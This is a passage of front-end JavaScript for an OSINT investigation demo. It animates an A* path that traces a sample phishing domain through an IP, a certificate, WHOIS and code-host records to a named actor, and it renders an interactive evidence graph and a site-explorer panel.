
// -------------------------------------------------------------
// Interactive A* Step-by-Step Path Resolution
// -------------------------------------------------------------
const astarTrajectory = [
  { id: "domain_phish_01", label: "chase-secure-verification.xyz", tier: 0, g: 0.0, h: 6.0, f: 6.0, desc: "Seed Phishing Domain" },
  { id: "ip_bulletproof", label: "185.220.101.5", tier: 1, g: 2.0, h: 4.5, f: 6.5, desc: "Bulletproof Infrastructure" },
  { id: "ssl_cert_sn", label: "Cert SN: 04fa8b", tier: 2, g: 3.5, h: 3.0, f: 6.5, desc: "CT Log Certificate" },
  { id: "domain_old_portfolio", label: "alex-devlabs.ru", tier: 2, g: 4.5, h: 3.0, f: 7.5, desc: "Developer Staging Domain" },
  { id: "email_registrant", label: "alex_darknet99@proton.me", tier: 3, g: 6.5, h: 1.5, f: 8.0, desc: "WHOIS Identity Anchor" },
  { id: "handle_github", label: "dev_alexperry", tier: 3, g: 8.0, h: 1.5, f: 9.5, desc: "Code Repository Commit Author" },
  { id: "actor_alex_perry", label: "Alexander Perry", tier: 4, g: 10.5, h: 0.0, f: 10.5, desc: "Target Identity Unmasked" }
];
let currentAStarIdx = 0;

function stepAStarNode() {
  if (currentAStarIdx >= astarTrajectory.length) {
    currentAStarIdx = 0;
    resetAStarStepper();
  }

  const step = astarTrajectory[currentAStarIdx];
  highlightNode(step.id, true);
  if (currentAStarIdx > 0) {
    highlightLink(astarTrajectory[currentAStarIdx - 1].id, step.id, true);
  }

  // Update telemetry
  const statusEl = document.getElementById("astarStatus");
  const nodeEl = document.getElementById("astarCurrentNode");
  const gEl = document.getElementById("astarGVal");
  const hEl = document.getElementById("astarHVal");
  const fEl = document.getElementById("astarFVal");
  const stripEl = document.getElementById("astarPathStrip");

  if (statusEl) statusEl.textContent = `Шаг ${currentAStarIdx + 1} / 7 (Tier ${step.tier})`;
  if (nodeEl) nodeEl.textContent = step.label;
  if (gEl) gEl.textContent = step.g.toFixed(2);
  if (hEl) hEl.textContent = step.h.toFixed(2);
  if (fEl) fEl.textContent = step.f.toFixed(2);

  if (stripEl) {
    // Mark previous as completed
    stripEl.querySelectorAll(".path-crumb").forEach(c => {
      c.classList.remove("active");
      c.classList.add("completed");
    });
    const crumb = document.createElement("span");
    crumb.className = "path-crumb active";
    crumb.textContent = `[T${step.tier}] ${step.label}`;
    stripEl.appendChild(crumb);
  }

  logTerminal(`A* Step ${currentAStarIdx + 1}: Visiting ${step.label} [g=${step.g.toFixed(1)}, h=${step.h.toFixed(1)}, f=${step.f.toFixed(1)}]`, "highlight");

  currentAStarIdx++;

  if (currentAStarIdx === astarTrajectory.length) {
    if (statusEl) statusEl.textContent = "Путь найден (Оптимально)";
    logTerminal("A* Optimal Path Found: cost=10.50, expanded 7 nodes (+12.5% gain over Dijkstra)", "highlight");
  }
}

function resetAStarStepper() {
  currentAStarIdx = 0;
  resetGraphView();
  const statusEl = document.getElementById("astarStatus");
  const nodeEl = document.getElementById("astarCurrentNode");
  const gEl = document.getElementById("astarGVal");
  const hEl = document.getElementById("astarHVal");
  const fEl = document.getElementById("astarFVal");
  const stripEl = document.getElementById("astarPathStrip");

  if (statusEl) statusEl.textContent = "Готов к запуску";
  if (nodeEl) nodeEl.textContent = "—";
  if (gEl) gEl.textContent = "0.00";
  if (hEl) hEl.textContent = "6.00";
  if (fEl) fEl.textContent = "6.00";
  if (stripEl) stripEl.innerHTML = "<span class=\"path-crumb active\">Начало</span>";
  logTerminal("A* Stepper reset.");
}

// ==========================================================================
// DROPSY OSINT PLATFORM // JAVASCRIPT ORCHESTRATOR
// Studio Interactive Suite: Telemetry Cursor · Magnetic Physics · Scramble ·
// Sticky Scroll-Scrubbing · Velocity Marquee · X-Ray Grid · Bash Simulator
// ==========================================================================

let currentGraph = null;
let selectedEntityId = "domain_phish_01";
let isDemoRunning = false;
let activeSensors = new Set();
const compactGraph = window.matchMedia("(max-width: 680px)");

document.addEventListener("DOMContentLoaded", async () => {
  initTabs();
  await fetchGraph();
  bindControls();
  initSiteExplorer();
  compactGraph.addEventListener("change", () => {
    if (currentGraph) {
      resetGraphViewport();
      renderSvgGraph(currentGraph);
    }
  });
  const params = new URLSearchParams(window.location.search);
  if (params.get("autoplay") === "1" && !window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
    playGuidedDemo();
  }
});

function initTabs() {
  const tabButtons = document.querySelectorAll(".nav-tab, .tab-btn");
  const tabPanes = document.querySelectorAll(".tab-pane, .tab-content");

  tabButtons.forEach(btn => {
    btn.setAttribute("aria-pressed", String(btn.classList.contains("active")));
    btn.setAttribute("aria-controls", btn.dataset.tab);
    btn.addEventListener("click", () => {
      const target = btn.dataset.tab;
      if (!target) return;

      tabButtons.forEach(b => {
        const selected = b === btn;
        b.classList.toggle("active", selected);
        b.setAttribute("aria-pressed", String(selected));
      });
      tabPanes.forEach(p => p.classList.remove("active"));

      const activePane = document.getElementById(target);
      if (activePane) activePane.classList.add("active");
    });
  });
}

// -------------------------------------------------------------
// Graph Fetch & Topology Initialization
// -------------------------------------------------------------
async function fetchGraph() {
  try {
    const res = await fetch("/api/graph");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    currentGraph = await res.json();
    renderSvgGraph(currentGraph);
  } catch (err) {
    console.warn("Could not load /api/graph dynamically, fallback to static case.", err);
    initFallbackGraph();
  }
}

function initFallbackGraph() {
  currentGraph = {
    entities: [
      { id: "domain_phish_01", name: "chase-secure-verification.xyz", entity_type: "DOMAIN", tier: 0, g: 0.0, h: 6.0, f: 6.0, cost: 0.0 },
      { id: "ip_bulletproof", name: "185.220.101.5", entity_type: "IP_ADDRESS", tier: 1, g: 2.0, h: 4.5, f: 6.5, cost: 2.0 },
      { id: "ssl_cert_sn", name: "Cert SN: 04fa8b", entity_type: "SSL_CERT", tier: 2, g: 3.5, h: 3.0, f: 6.5, cost: 1.5 },
      { id: "domain_old_portfolio", name: "alex-devlabs.ru", entity_type: "DOMAIN", tier: 2, g: 4.5, h: 3.0, f: 7.5, cost: 1.0 },
      { id: "email_registrant", name: "alex_darknet99@proton.me", entity_type: "EMAIL", tier: 3, g: 6.5, h: 1.5, f: 8.0, cost: 2.0 },
      { id: "handle_github", name: "dev_alexperry", entity_type: "HANDLE", tier: 3, g: 8.0, h: 1.5, f: 9.5, cost: 1.5 },
      { id: "crypto_monero", name: "bc1q9...dark", entity_type: "CRYPTO_WALLET", tier: 3, g: 8.5, h: 1.5, f: 10.0, cost: 2.5 },
      { id: "actor_alex_perry", name: "Alexander Perry", entity_type: "PERSON", tier: 4, g: 10.5, h: 0.0, f: 10.5, cost: 2.5 }
    ],
    links: [
      { source: "domain_phish_01", target: "ip_bulletproof", weight: 2.0, label: "resolves_to" },
      { source: "ip_bulletproof", target: "ssl_cert_sn", weight: 1.5, label: "pivots_cert" },
      { source: "ssl_cert_sn", target: "domain_old_portfolio", weight: 1.0, label: "san_overlap" },
      { source: "domain_old_portfolio", target: "email_registrant", weight: 2.0, label: "whois_admin" },
      { source: "email_registrant", target: "handle_github", weight: 1.5, label: "commit_author" },
      { source: "handle_github", target: "actor_alex_perry", weight: 2.5, label: "unmasks_actor" }
    ]
  };
  renderSvgGraph(currentGraph);
}

// -------------------------------------------------------------
// SVG Graph Renderer (5-Tier Maltego Layout)
// -------------------------------------------------------------

// -------------------------------------------------------------
// Evidence Topology Interactive Pan, Zoom & Free Drag Engine
// -------------------------------------------------------------
const graphNav = {
  panX: 0,
  panY: 0,
  zoom: 1.0,
  minZoom: 0.35,
  maxZoom: 3.5,
  isPanning: false,
  panStartClientX: 0,
  panStartClientY: 0,
  panStartPanX: 0,
  panStartPanY: 0,
  isDraggingNode: false,
  dragNodeId: null,
  dragNodeEl: null,
  dragMoved: false,
  dragStartMouseX: 0,
  dragStartMouseY: 0,
  dragOffsetWorldX: 0,
  dragOffsetWorldY: 0,
  nodePositions: {},
  initialized: false
};

function screenToSvgCoords(svg, clientX, clientY) {
  const pt = svg.createSVGPoint();
  pt.x = clientX;
  pt.y = clientY;
  const ctm = svg.getScreenCTM();
  if (ctm) {
    const transformed = pt.matrixTransform(ctm.inverse());
    return { x: transformed.x, y: transformed.y };
  }
  const rect = svg.getBoundingClientRect();
  const vb = svg.viewBox.baseVal;
  const scaleX = (vb && vb.width) ? vb.width / rect.width : 1;
  const scaleY = (vb && vb.height) ? vb.height / rect.height : 1;
  return {
    x: (clientX - rect.left) * scaleX,
    y: (clientY - rect.top) * scaleY
  };
}

function applyGraphTransform() {
  const viewport = document.getElementById("viewportGroup");
  if (!viewport) return;
  viewport.setAttribute("transform", `translate(${graphNav.panX.toFixed(2)}, ${graphNav.panY.toFixed(2)}) scale(${graphNav.zoom.toFixed(4)})`);
}

function resetGraphViewport() {
  graphNav.panX = 0;
  graphNav.panY = 0;
  graphNav.zoom = 1.0;
  applyGraphTransform();
}

function zoomGraphAtPoint(factor, clientX, clientY) {
  const svg = document.getElementById("entitySvg");
  const container = document.getElementById("svgContainer");
  if (!svg || !container) return;

  const oldZoom = graphNav.zoom;
  const newZoom = Math.min(graphNav.maxZoom, Math.max(graphNav.minZoom, oldZoom * factor));
  if (Math.abs(newZoom - oldZoom) < 0.001) return;

  let cx = clientX;
  let cy = clientY;
  if (cx === undefined || cy === undefined) {
    const cRect = container.getBoundingClientRect();
    cx = cRect.left + cRect.width / 2;
    cy = cRect.top + cRect.height / 2;
  }

  const svgPt = screenToSvgCoords(svg, cx, cy);
  const worldX = (svgPt.x - graphNav.panX) / oldZoom;
  const worldY = (svgPt.y - graphNav.panY) / oldZoom;

  graphNav.panX = svgPt.x - worldX * newZoom;
  graphNav.panY = svgPt.y - worldY * newZoom;
  graphNav.zoom = newZoom;
  applyGraphTransform();
}

function updateGraphEdgeEndpoints(nodeId, newX, newY) {
  if (!currentGraph || !currentGraph.links) return;
  const pos = graphNav.nodePositions;
  if (!pos[nodeId]) return;
  pos[nodeId].x = newX;
  pos[nodeId].y = newY;

  currentGraph.links.forEach(link => {
    if (link.source === nodeId || link.target === nodeId) {
      const s = pos[link.source];
      const t = pos[link.target];
      if (!s || !t) return;
      const line = document.getElementById(`link-${link.source}-${link.target}`);
      if (line) {
        line.setAttribute("x1", s.x);
        line.setAttribute("y1", s.y);
        line.setAttribute("x2", t.x);
        line.setAttribute("y2", t.y);
      }
      const midX = (s.x + t.x) / 2;
      const midY = (s.y + t.y) / 2 - 6;
      const weightGroup = document.getElementById(`weight-${link.source}-${link.target}`);
      if (weightGroup) {
        const bgRect = weightGroup.querySelector("rect");
        const txt = weightGroup.querySelector("text");
        if (bgRect) {
          bgRect.setAttribute("x", midX - 16);
          bgRect.setAttribute("y", midY - 9);
        }
        if (txt) {
          txt.setAttribute("x", midX);
          txt.setAttribute("y", midY + 3);
        }
      }
    }
  });
}

function bindNodeDrag(nodeEl, entity) {
  const onStart = (e) => {
    if (e.button !== undefined && e.button !== 0) return;
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;

    const svg = document.getElementById("entitySvg");
    if (!svg) return;
    const svgPt = screenToSvgCoords(svg, clientX, clientY);
    const worldX = (svgPt.x - graphNav.panX) / graphNav.zoom;
    const worldY = (svgPt.y - graphNav.panY) / graphNav.zoom;

    const pos = graphNav.nodePositions[entity.id] || { x: 0, y: 0 };
    graphNav.isDraggingNode = true;
    graphNav.dragNodeId = entity.id;
    graphNav.dragNodeEl = nodeEl;
    graphNav.dragMoved = false;
    graphNav.dragStartMouseX = clientX;
    graphNav.dragStartMouseY = clientY;
    graphNav.dragOffsetWorldX = worldX - pos.x;
    graphNav.dragOffsetWorldY = worldY - pos.y;
    nodeEl.classList.add("is-dragging");

    e.stopPropagation();
  };

  nodeEl.addEventListener("mousedown", onStart);
  nodeEl.addEventListener("touchstart", onStart, { passive: true });
}

function initGraphNavigation() {
  if (graphNav.initialized) return;
  const container = document.getElementById("svgContainer");
  const svg = document.getElementById("entitySvg");
  if (!container || !svg) return;
  graphNav.initialized = true;

  // Background Pan
  container.addEventListener("mousedown", (e) => {
    if (e.button !== 0) return;
    if (e.target.closest(".graph-nav-hud, .graph-nav-btn, .svg-node")) return;

    graphNav.isPanning = true;
    graphNav.panStartClientX = e.clientX;
    graphNav.panStartClientY = e.clientY;
    graphNav.panStartPanX = graphNav.panX;
    graphNav.panStartPanY = graphNav.panY;
    container.classList.add("is-panning");
  });

  window.addEventListener("mousemove", (e) => {
    if (graphNav.isDraggingNode && graphNav.dragNodeId) {
      const dist = Math.hypot(e.clientX - graphNav.dragStartMouseX, e.clientY - graphNav.dragStartMouseY);
      if (dist > 3) graphNav.dragMoved = true;

      const svgPt = screenToSvgCoords(svg, e.clientX, e.clientY);
      const worldX = (svgPt.x - graphNav.panX) / graphNav.zoom;
      const worldY = (svgPt.y - graphNav.panY) / graphNav.zoom;

      const newX = worldX - graphNav.dragOffsetWorldX;
      const newY = worldY - graphNav.dragOffsetWorldY;

      if (graphNav.dragNodeEl) {
        graphNav.dragNodeEl.setAttribute("transform", `translate(${newX.toFixed(2)}, ${newY.toFixed(2)})`);
      }
      updateGraphEdgeEndpoints(graphNav.dragNodeId, newX, newY);
      return;
    }

    if (graphNav.isPanning) {
      const startPt = screenToSvgCoords(svg, graphNav.panStartClientX, graphNav.panStartClientY);
      const curPt = screenToSvgCoords(svg, e.clientX, e.clientY);
      const deltaX = curPt.x - startPt.x;
      const deltaY = curPt.y - startPt.y;

      graphNav.panX = graphNav.panStartPanX + deltaX;
      graphNav.panY = graphNav.panStartPanY + deltaY;
      applyGraphTransform();
    }
  });

  window.addEventListener("mouseup", (e) => {
    if (graphNav.isDraggingNode) {
      const moved = graphNav.dragMoved;
      const draggedId = graphNav.dragNodeId;
      if (graphNav.dragNodeEl) {
        graphNav.dragNodeEl.classList.remove("is-dragging");
      }
      graphNav.isDraggingNode = false;
      graphNav.dragNodeId = null;
      graphNav.dragNodeEl = null;

      if (!moved && draggedId && currentGraph) {
        const ent = currentGraph.entities.find(x => x.id === draggedId);
        if (ent) selectEntityNode(ent);
      }
    }

    if (graphNav.isPanning) {
      graphNav.isPanning = false;
      container.classList.remove("is-panning");
    }
  });

  // Double click reset
  container.addEventListener("dblclick", (e) => {
    if (e.target.closest(".graph-nav-hud, .graph-nav-btn, .svg-node")) return;
    resetGraphViewport();
  });

  // Zoom via wheel: gentle, smooth dampening (4% per notch instead of 12%)
  container.addEventListener("wheel", (e) => {
    e.preventDefault();
    const factor = e.deltaY < 0 ? 1.04 : 0.96;
    zoomGraphAtPoint(factor, e.clientX, e.clientY);
  }, { passive: false });

  // Touch Support
  let initialPinchDist = 0;
  let pinchStartZoom = 1.0;

  container.addEventListener("touchstart", (e) => {
    if (e.touches.length === 1) {
      if (e.target.closest(".graph-nav-hud, .graph-nav-btn, .svg-node")) return;
      graphNav.isPanning = true;
      graphNav.panStartClientX = e.touches[0].clientX;
      graphNav.panStartClientY = e.touches[0].clientY;
      graphNav.panStartPanX = graphNav.panX;
      graphNav.panStartPanY = graphNav.panY;
      container.classList.add("is-panning");
    } else if (e.touches.length === 2) {
      graphNav.isPanning = false;
      container.classList.remove("is-panning");
      initialPinchDist = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
      pinchStartZoom = graphNav.zoom;
    }
  }, { passive: true });

  window.addEventListener("touchmove", (e) => {
    if (graphNav.isDraggingNode && graphNav.dragNodeId && e.touches.length === 1) {
      const touch = e.touches[0];
      const dist = Math.hypot(touch.clientX - graphNav.dragStartMouseX, touch.clientY - graphNav.dragStartMouseY);
      if (dist > 3) graphNav.dragMoved = true;

      const svgPt = screenToSvgCoords(svg, touch.clientX, touch.clientY);
      const worldX = (svgPt.x - graphNav.panX) / graphNav.zoom;
      const worldY = (svgPt.y - graphNav.panY) / graphNav.zoom;

      const newX = worldX - graphNav.dragOffsetWorldX;
      const newY = worldY - graphNav.dragOffsetWorldY;

      if (graphNav.dragNodeEl) {
        graphNav.dragNodeEl.setAttribute("transform", `translate(${newX.toFixed(2)}, ${newY.toFixed(2)})`);
      }
      updateGraphEdgeEndpoints(graphNav.dragNodeId, newX, newY);
      if (e.cancelable) e.preventDefault();
      return;
    }

    if (graphNav.isPanning && e.touches.length === 1) {
      const touch = e.touches[0];
      const startPt = screenToSvgCoords(svg, graphNav.panStartClientX, graphNav.panStartClientY);
      const curPt = screenToSvgCoords(svg, touch.clientX, touch.clientY);
      graphNav.panX = graphNav.panStartPanX + (curPt.x - startPt.x);
      graphNav.panY = graphNav.panStartPanY + (curPt.y - startPt.y);
      applyGraphTransform();
      if (e.cancelable) e.preventDefault();
    } else if (e.touches.length === 2 && initialPinchDist > 0) {
      const curDist = Math.hypot(e.touches[0].clientX - e.touches[1].clientX, e.touches[0].clientY - e.touches[1].clientY);
      const midClientX = (e.touches[0].clientX + e.touches[1].clientX) / 2;
      const midClientY = (e.touches[0].clientY + e.touches[1].clientY) / 2;
      const factor = curDist / initialPinchDist;
      const targetZoom = Math.min(graphNav.maxZoom, Math.max(graphNav.minZoom, pinchStartZoom * factor));
      zoomGraphAtPoint(targetZoom / graphNav.zoom, midClientX, midClientY);
      if (e.cancelable) e.preventDefault();
    }
  }, { passive: false });

  window.addEventListener("touchend", () => {
    if (graphNav.isDraggingNode) {
      const moved = graphNav.dragMoved;
      const draggedId = graphNav.dragNodeId;
      if (graphNav.dragNodeEl) graphNav.dragNodeEl.classList.remove("is-dragging");
      graphNav.isDraggingNode = false;
      graphNav.dragNodeId = null;
      graphNav.dragNodeEl = null;
      if (!moved && draggedId && currentGraph) {
        const ent = currentGraph.entities.find(x => x.id === draggedId);
        if (ent) selectEntityNode(ent);
      }
    }
    if (graphNav.isPanning) {
      graphNav.isPanning = false;
      container.classList.remove("is-panning");
    }
    initialPinchDist = 0;
  });

  // HUD Buttons
  const btnZoomIn = document.getElementById("btnGraphZoomIn");
  const btnZoomOut = document.getElementById("btnGraphZoomOut");
  const btnReset = document.getElementById("btnGraphResetView");

  if (btnZoomIn) {
    btnZoomIn.addEventListener("click", (e) => {
      e.stopPropagation();
      zoomGraphAtPoint(1.08); // Gentle 8% zoom step instead of 25%
    });
  }
  if (btnZoomOut) {
    btnZoomOut.addEventListener("click", (e) => {
      e.stopPropagation();
      zoomGraphAtPoint(0.92); // Gentle 8% zoom step instead of 20%
    });
  }
  if (btnReset) {
    btnReset.addEventListener("click", (e) => {
      e.stopPropagation();
      resetGraphViewport();
    });
  }
}


function renderSvgGraph(graph) {
  const hudNodes = document.getElementById("hudNodes");
  if (hudNodes) hudNodes.textContent = `${graph.entities.length} nodes`;
  const svg = document.getElementById("entitySvg");
  if (!svg) return;

  const linksLayer = document.getElementById("linksLayer");
  const weightsLayer = document.getElementById("weightsLayer");
  const pivotLayer = document.getElementById("pivotLayer");
  const entitiesLayer = document.getElementById("entitiesLayer");

  if (!linksLayer || !entitiesLayer) return;

  linksLayer.innerHTML = "";
  weightsLayer.innerHTML = "";
  pivotLayer.innerHTML = "";
  entitiesLayer.innerHTML = "";

  const tiers = [...new Set(graph.entities.map(e => Math.min(4, Math.max(0, Number(e.tier) || 0))))].sort((a,b) => a-b);
  const groups = new Map(tiers.map(t => [t, []]));
  graph.entities.forEach(e => groups.get(Math.min(4, Math.max(0, Number(e.tier) || 0))).push(e));
  const compact = compactGraph.matches;
  const largestGroup = Math.max(1, ...[...groups.values()].map(group => group.length));
  const layoutWidth = compact ? Math.max(360, largestGroup * 120 + 26) : Math.max(1040, tiers.length * 230 + 110);
  const layoutHeight = compact ? Math.max(310, tiers.length * 72 + 58) : Math.max(380, largestGroup * 68 + 60);
  svg.setAttribute("viewBox", `0 0 ${layoutWidth} ${layoutHeight}`);

  const nodePos = {};
  tiers.forEach((tier, groupIndex) => {
    const items = groups.get(tier);
    items.forEach((entity, index) => {
      const groupProgress = groupIndex / Math.max(1, tiers.length - 1);
      const itemProgress = items.length === 1 ? .5 : index / (items.length - 1);
      const x = compact ? 71 + itemProgress * (layoutWidth - 142) : 105 + groupProgress * (layoutWidth - 190);
      const y = compact ? 35 + groupProgress * (layoutHeight - 76) : 55 + itemProgress * (layoutHeight - 110);
      nodePos[entity.id] = {x, y, entity};
    });
  });
  graphNav.nodePositions = nodePos;

  const countBadge = document.querySelector(".graph-card .card-meta");
  if (countBadge) countBadge.textContent = `Узлов: ${graph.entities.length} · связей: ${graph.links.length}`;

  // Render Links
  graph.links.forEach((link) => {
    const s = nodePos[link.source];
    const t = nodePos[link.target];
    if (!s || !t) return;

    const line = document.createElementNS("http://www.w3.org/2000/svg", "line");
    line.setAttribute("x1", s.x);
    line.setAttribute("y1", s.y);
    line.setAttribute("x2", t.x);
    line.setAttribute("y2", t.y);
    line.setAttribute("stroke", "#8ea89a");
    line.setAttribute("stroke-width", "1.5");
    line.setAttribute("id", `link-${link.source}-${link.target}`);
    linksLayer.appendChild(line);

    // Grouped edge weight badge for instant tracking during drag
    const midX = (s.x + t.x) / 2;
    const midY = (s.y + t.y) / 2 - 6;

    const weightGroup = document.createElementNS("http://www.w3.org/2000/svg", "g");
    weightGroup.setAttribute("id", `weight-${link.source}-${link.target}`);

    const bgRect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    bgRect.setAttribute("x", midX - 16);
    bgRect.setAttribute("y", midY - 9);
    bgRect.setAttribute("width", 32);
    bgRect.setAttribute("height", 16);
    bgRect.setAttribute("rx", "3");
    bgRect.setAttribute("fill", "#f5f4ee");
    bgRect.setAttribute("stroke", "#c9d0c5");
    bgRect.setAttribute("stroke-width", "1");
    weightGroup.appendChild(bgRect);

    const txt = document.createElementNS("http://www.w3.org/2000/svg", "text");
    txt.setAttribute("x", midX);
    txt.setAttribute("y", midY + 3);
    txt.setAttribute("font-family", "Dropsy Mono, monospace");
    txt.setAttribute("font-size", "9px");
    txt.setAttribute("font-weight", "500");
    txt.setAttribute("fill", "#285c48");
    txt.setAttribute("text-anchor", "middle");
    txt.textContent = `w=${Number(link.obfuscation_cost ?? link.weight ?? 1).toFixed(1)}`;
    weightGroup.appendChild(txt);

    weightsLayer.appendChild(weightGroup);
  });

  // Render Nodes
  graph.entities.forEach(entity => {
    const pos = nodePos[entity.id];
    if (!pos) return;

    const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
    g.setAttribute("class", `svg-node ${entity.id === "actor_alex_perry" ? "target-actor" : ""}`);
    g.setAttribute("id", `node-${entity.id}`);
    g.setAttribute("transform", `translate(${pos.x}, ${pos.y})`);

    const isTarget = entity.id === "actor_alex_perry";
    const boxWidth = isTarget ? 130 : 112;
    const boxHeight = 44;

    const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    rect.setAttribute("x", -boxWidth / 2);
    rect.setAttribute("y", -boxHeight / 2);
    rect.setAttribute("width", boxWidth);
    rect.setAttribute("height", boxHeight);
    rect.setAttribute("rx", "4");
    rect.setAttribute("fill", isTarget ? "#e6f0df" : "#ffffff");
    rect.setAttribute("stroke", isTarget ? "#36765a" : "#8ea89a");
    rect.setAttribute("stroke-width", isTarget ? "1.5" : "1");
    rect.setAttribute("id", `rect-${entity.id}`);
    g.appendChild(rect);

    // Tier badge inside node
    const tierTxt = document.createElementNS("http://www.w3.org/2000/svg", "text");
    tierTxt.setAttribute("x", 0);
    tierTxt.setAttribute("y", -6);
    tierTxt.setAttribute("font-family", "Dropsy Mono, monospace");
    tierTxt.setAttribute("font-size", "8.5px");
    tierTxt.setAttribute("font-weight", "600");
    tierTxt.setAttribute("fill", isTarget ? "#36765a" : "#285c48");
    tierTxt.setAttribute("text-anchor", "middle");
    tierTxt.textContent = `TIER ${entity.tier} · ${entity.entity_type}`;
    g.appendChild(tierTxt);

    // Node Name label
    const nameTxt = document.createElementNS("http://www.w3.org/2000/svg", "text");
    nameTxt.setAttribute("x", 0);
    nameTxt.setAttribute("y", 12);
    nameTxt.setAttribute("font-family", "system-ui, sans-serif");
    nameTxt.setAttribute("font-size", isTarget ? "11px" : "10px");
    nameTxt.setAttribute("font-weight", "600");
    nameTxt.setAttribute("fill", "#172f25");
    nameTxt.setAttribute("text-anchor", "middle");
    nameTxt.textContent = truncateLabel(entity.name, 16);
    g.appendChild(nameTxt);

    // Enable free node dragging & clicking
    g.setAttribute("role", "button");
    g.setAttribute("tabindex", "0");
    g.setAttribute("aria-label", entity.name);
    g.addEventListener("keydown", event => {
      if (event.key !== "Enter" && event.key !== " ") return;
      event.preventDefault();
      selectEntityNode(entity);
    });
    bindNodeDrag(g, entity);

    entitiesLayer.appendChild(g);
  });

  initGraphNavigation();
  applyGraphTransform();
}

function truncateLabel(str, max) {
  if (!str) return "";
  return str.length > max ? str.slice(0, max - 2) + ".." : str;
}


// -------------------------------------------------------------
// Visual Site Structure & Open Source Code Explorer Engine
// -------------------------------------------------------------
const siteExplorerState = {
  items: [],
  filtered: [],
  activeItem: null,
  currentFilter: "all"
};

function initSiteExplorer() {
  const filterBtns = document.querySelectorAll(".se-filter-btn");
  filterBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      filterBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      siteExplorerState.currentFilter = btn.dataset.filter || "all";
      renderExplorerTree();
    });
  });

  const btnCopy = document.getElementById("btnCopyCode");
  if (btnCopy) {
    btnCopy.addEventListener("click", () => {
      const code = document.getElementById("seCodeBlock")?.textContent || "";
      navigator.clipboard.writeText(code).then(() => {
        btnCopy.textContent = "Скопировано";
        setTimeout(() => btnCopy.textContent = "Копировать", 1500);
      }).catch(() => {
        btnCopy.textContent = "Не удалось скопировать";
        setTimeout(() => btnCopy.textContent = "Копировать", 1500);
      });
    });
  }

  // Populate default forensic case explorer on load
  populateDefaultCaseExplorer();

}

function updateExplorerCounts(data) {
  const allCount = siteExplorerState.items.length;
  const pagesCount = siteExplorerState.items.filter(i => i.type === "pages").length;
  const scriptsCount = siteExplorerState.items.filter(i => i.type === "scripts").length;
  const netCount = siteExplorerState.items.filter(i => i.type === "network").length;

  const elAll = document.getElementById("seCountAll");
  const elPages = document.getElementById("seCountPages");
  const elScripts = document.getElementById("seCountScripts");
  const elNet = document.getElementById("seCountNet");

  if (elAll) elAll.textContent = allCount;
  if (elPages) elPages.textContent = pagesCount;
  if (elScripts) elScripts.textContent = scriptsCount;
  if (elNet) elNet.textContent = netCount;

  const mPages = document.getElementById("sePagesCount");
  const mAssets = document.getElementById("seAssetsCount");
  const mEndpoints = document.getElementById("seEndpointsCount");
  const mPorts = document.getElementById("sePortsCount");
  const mGrade = document.getElementById("seSecGrade");

  if (mPages) mPages.textContent = data.pages?.length || pagesCount || 0;
  if (mAssets) mAssets.textContent = scriptsCount + (data.open_ports?.length || 0);
  if (mEndpoints) mEndpoints.textContent = (data.page_links?.length || pagesCount || 0);
  if (mPorts) mPorts.textContent = data.open_ports?.length || (data.target_type === "LOCAL_DIRECTORY" ? 0 : 2);
  if (mGrade) {
    const g = data.security_audit?.grade || (data.ssl_info ? "A+" : "B");
    mGrade.textContent = `GRADE: ${g}`;
  }
}

function renderExplorerTree() {
  const container = document.getElementById("seTreeList");
  if (!container) return;

  container.innerHTML = "";
  const filter = siteExplorerState.currentFilter;
  const visibleItems = filter === "all" ? siteExplorerState.items : siteExplorerState.items.filter(i => i.type === filter);

  if (visibleItems.length === 0) {
    container.innerHTML = `<div style="padding:16px; font-family:var(--mono); font-size:12px; color:var(--muted); text-align:center;">Нет материалов в этой категории.</div>`;
    return;
  }

  visibleItems.forEach(item => {
    const el = document.createElement("button");
    el.type = "button";
    el.className = `se-tree-item ${siteExplorerState.activeItem?.id === item.id ? "active" : ""}`;
    el.innerHTML = `
      <span class="se-item-tag">${item.tag || item.icon || "FILE"}</span>
      <div class="se-item-info">
        <span class="se-item-name" title="${item.path}">${item.name}</span>
        <span class="se-item-sub">${item.path}</span>
      </div>
      <span class="se-item-badge ${item.badgeClass}">${item.badge}</span>
    `;

    el.addEventListener("click", () => {
      selectExplorerItem(item);
    });

    container.appendChild(el);
  });
}

function selectExplorerItem(item) {
  siteExplorerState.activeItem = item;

  // Highlight in tree
  document.querySelectorAll(".se-tree-item").forEach(el => {
    el.classList.remove("active");
  });
  const currentEls = document.querySelectorAll(".se-tree-item");
  currentEls.forEach(el => {
    if (el.querySelector(".se-item-name")?.textContent === item.name) {
      el.classList.add("active");
    }
  });

  // Update Toolbar
  const iconEl = document.getElementById("seActiveIcon");
  const pathEl = document.getElementById("seActivePath");
  const badgeEl = document.getElementById("seActiveBadge");
  const codeEl = document.getElementById("seCodeBlock");

  if (iconEl) iconEl.textContent = item.tag || item.icon || "FILE";
  if (pathEl) pathEl.textContent = item.path;
  if (badgeEl) badgeEl.textContent = `${item.contentType} · ${item.badge}`;
  if (codeEl) codeEl.textContent = item.code || "// [No code available for this artifact]";

  // Update Bottom Meta
  const metaType = document.getElementById("seMetaContentType");
  const metaSize = document.getElementById("seMetaSize");
  const metaLines = document.getElementById("seMetaLines");
  const metaHeaders = document.getElementById("seMetaHeaders");

  if (metaType) metaType.textContent = item.contentType;
  if (metaSize) metaSize.textContent = item.size;
  if (metaLines) metaLines.textContent = item.lines;
  if (metaHeaders) metaHeaders.textContent = item.headers?.split("\n")[0] || "Active Verified";
}

function populateDefaultCaseExplorer() {
  const defaultItems = [
    {
      id: "phish_index",
      type: "pages",
      name: "index.html (Phishing Landing)",
      path: "https://chase-secure-verification.xyz/",
      tag: "HTML", icon: "HTML",
      badge: "200 OK",
      badgeClass: "se-badge-200",
      contentType: "text/html",
      size: "4.8 KB",
      lines: 84,
      headers: "Server: nginx/1.24.0\nContent-Type: text/html; charset=UTF-8\nX-Powered-By: PHP/8.1",
